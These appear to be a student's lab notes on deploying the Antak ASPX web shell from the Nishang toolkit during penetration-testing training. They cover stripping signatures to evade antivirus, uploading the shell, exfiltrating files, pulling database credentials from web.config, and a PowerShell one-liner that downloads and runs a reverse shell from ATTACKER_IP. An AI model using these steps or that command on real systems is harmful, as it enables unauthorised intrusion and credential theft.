# Antak Web Shell

# What is Antak

ASPX-based web shell from the **Nishang** offensive PowerShell toolkit. Uses PowerShell to interact with the underlying Windows OS. Executes each command as a new process and can execute scripts **in memory** + encode commands.

**Location:** `/usr/share/nishang/Antak-WebShell/antak.aspx`

---

## ASPX Background

**Active Server Page Extended (ASPX)** = runs on Microsoft's ASP.NET Framework on IIS (Windows web servers). User input → processed server-side → converted to HTML output. This makes it ideal for Windows web server exploitation.

---

## Antak vs Laudanum

| Feature | Laudanum | Antak |
| --- | --- | --- |
| Language | Multi (PHP, ASPX, JSP, etc.) | ASPX only |
| Interface | Simple cmd box | PowerShell-themed UI |
| Auth | IP allowlist | Username + Password |
| In-memory execution | No | Yes |
| Command encoding | No | Yes |
| File upload/download | No | Yes |
| Best for | Quick shell via upload | Full PowerShell interaction on Windows |

---

## Methodology

```
Copy file → Set credentials → Remove signatures → Upload → Navigate → Login → Execute commands
```

---

## Step 1: Copy the File

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

---

## Step 2: Modify Before Upload

- **Line 14:** Set username and password for access
- **Remove ASCII art and comments** — commonly signatured by AV/IDS

```
# Line 14 example:
if (user == "htb-student" && password == "HTB_@cademy!")
```

---

## Step 3: Upload to Target

- Use the web app's file upload function
- Files typically stored at `\\files\` directory
- Navigate to: `http://status.inlanefreight.local//files/Upload.aspx`

---

## Step 4: Login & Use

- Browser shows **username/password prompt** (your set credentials)
- After login → PowerShell-style interface

**Available Functions:**

- `Submit` — run PowerShell commands
- `Upload the File` — upload additional tools/payloads
- `Download` — exfiltrate files
- `Encode and Execute` — obfuscate and run scripts in memory
- `Parse web.config` — extract DB credentials from config
- `Execute SQL Query` — interact with databases directly

---

## Useful Commands Inside Antak

```powershell
help                    # list available commands
whoami                  # current user context
systeminfo              # full system info
dir C:\Users            # list user directories
```

---

## Delivery of Further Payloads from Antak

```powershell
# Download and execute a reverse shell payload (PowerShell one-liner)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')

# Or use the Upload button to upload MSFvenom-generated payload
```

---

## Key Takeaways

- Antak = PowerShell in a browser — more powerful than basic web shells
- Credential protection = more secure than IP-based allowlist (Laudanum)
- In-memory execution = harder to detect by AV (no file written to disk)
- `Encode and Execute` = built-in obfuscation → bypasses some script-based detection
- `Parse web.config` = often reveals database credentials → major lateral movement opportunity
- Remove signatures (comments/ASCII art) before every upload — a common reason shells get caught
- Learning tip: use ippsec.rocks to search for concepts by keyword → timestamps in YouTube walkthroughs

---

## Assessment

![image.png](Antak%20Web%20Shell/image.png)